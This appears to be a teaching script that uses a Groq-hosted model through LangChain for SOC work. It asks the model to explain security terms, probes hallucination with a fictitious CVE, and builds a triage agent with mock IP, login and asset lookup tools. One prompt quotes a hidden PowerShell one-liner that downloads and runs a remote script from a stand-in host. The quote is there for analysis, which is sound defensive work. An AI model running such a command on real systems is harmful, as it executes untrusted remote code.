import os
from dotenv import load_dotenv
import pandas as pd

load_dotenv()
from langchain_groq import ChatGroq
from langchain_core.messages import SystemMessage, HumanMessage
from langchain_core.tools import tool
from langchain.agents import create_agent

# 1. Load environment variables from .env file
groq_api_key = os.getenv("GROQ_API_KEY")

# 2. Create the chat model (temperature=0 gives more repeatable answers)
llm = ChatGroq(model="openai/gpt-oss-120b", temperature=0)

# =====================================================================
# SECTION 1: LLM CAPABILITIES & LIMITATIONS
# =====================================================================
response = llm.invoke("In two sentences, what is a brute-force login attack?")
print("--- Brute Force Explanation ---")
print(response.content)

messages = [
    SystemMessage(content="You are a Tier-1 SOC analyst. Answer in at most 3 bullet points."),
    HumanMessage(content="Explain what this command does: "
                         "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)"
                         ".DownloadString('http://example.com/a.ps1')\""),
]
response = llm.invoke(messages)
print("\n--- PowerShell Obfuscation Analysis ---")
print(response.content)

# Test limitations (Live threat intel & non-existent CVE)
print("\n--- Testing Knowledge Cutoff & Hallucination ---")
print(llm.invoke("What is the current threat-intelligence reputation of IP 203.0.113.45?").content)
print(llm.invoke("Summarise CVE-2026-99999 and its CVSS score.").content)


# =====================================================================
# SECTION 2: TOOL DEFINITIONS & AGENTIC SOC TRIAGE
# =====================================================================
IP_REPUTATION = {
    "203.0.113.45": "malicious - Tor exit node, reported for SSH brute force",
    "198.51.100.23": "suspicious - scanning activity in the last 7 days",
    "10.0.0.12": "internal - corporate VPN gateway",
}

USER_LOGINS = {
    "harish": "09:02 Aberdeen, UK (10.0.0.12); 09:15 Lagos, NG (203.0.113.45)",
    "Benjamin": "08:47 Aberdeen, UK (10.0.0.12)",
}

ASSETS = {
    "hr-laptop-07": "criticality HIGH - HR department, stores personal data",
    "build-server-02": "criticality LOW - CI build server, no sensitive data",
}

SYSTEM_PROMPT = (
    "You are a Tier-1 SOC analyst. For each alert, use the tools to gather evidence "
    "before deciding. End your answer with 'VERDICT: ESCALATE' or 'VERDICT: CLOSE' "
    "followed by a one-sentence reason."
)

@tool
def check_ip_reputation(ip_address: str) -> str:
    """Look up the threat-intelligence reputation of an IPv4 address.
    Returns malicious, suspicious, internal or unknown, with a short reason."""
    return IP_REPUTATION.get(ip_address, "unknown - no records")

@tool
def get_user_logins(username: str) -> str:
    """Return the last 24 hours of login times, locations and source IPs for a username."""
    return USER_LOGINS.get(username, "no logins found")

@tool
def get_asset(hostname: str) -> str:
    """Return the business criticality and role of a host, given its hostname."""
    return ASSETS.get(hostname, "unknown asset - not in inventory")

# Combine all 3 tools into the agent
tools = [check_ip_reputation, get_user_logins, get_asset]

agent = create_agent(
    model=llm,
    tools=tools,
    system_prompt=SYSTEM_PROMPT
)

if __name__ == "__main__":
    report_csv = "pipeline_verdict_report.csv"

    if os.path.exists(report_csv):
        print(f"\n[+] Loading pipeline verdict report from '{report_csv}'...")
        df_verdicts = pd.read_csv(report_csv)

        # Filter for malicious verdicts that were escalated to Stage 2
        escalated_alerts = df_verdicts[df_verdicts["Stage1_Flag"] == "Malicious"]
        print(f"[+] Found {len(escalated_alerts)} malicious alerts escalated from the pipeline to triage.")

        # Loop through real pipeline verdicts and pass them to the agent!
        for i, row in escalated_alerts.head(3).iterrows():
            alert_desc = (
                f"Alert ID: {row['ID']} | "
                f"Stage 1 Flag: {row['Stage1_Flag']} (Confidence: {row['Stage1_Confidence']}) | "
                f"Stage 2 Attack Classification: {row['Stage2_Attack_Type']}"
            )

            print(f"\n==================================================")
            print(f"Triaging Pipeline Verdict: {row['ID']} -> {row['Stage2_Attack_Type']}")
            print(f"==================================================")

            result = agent.invoke({"messages": [{"role": "user", "content": alert_desc}]})
            for m in result["messages"]:
                m.pretty_print()
    else:
        print(f"[!] '{report_csv}' not found. Running fallback hardcoded test alert...")
        alert = "ALERT-1001: Successful login for user harish from 203.0.113.45."
        result = agent.invoke({"messages": [{"role": "user", "content": alert}]})
        for m in result["messages"]:
            m.pretty_print()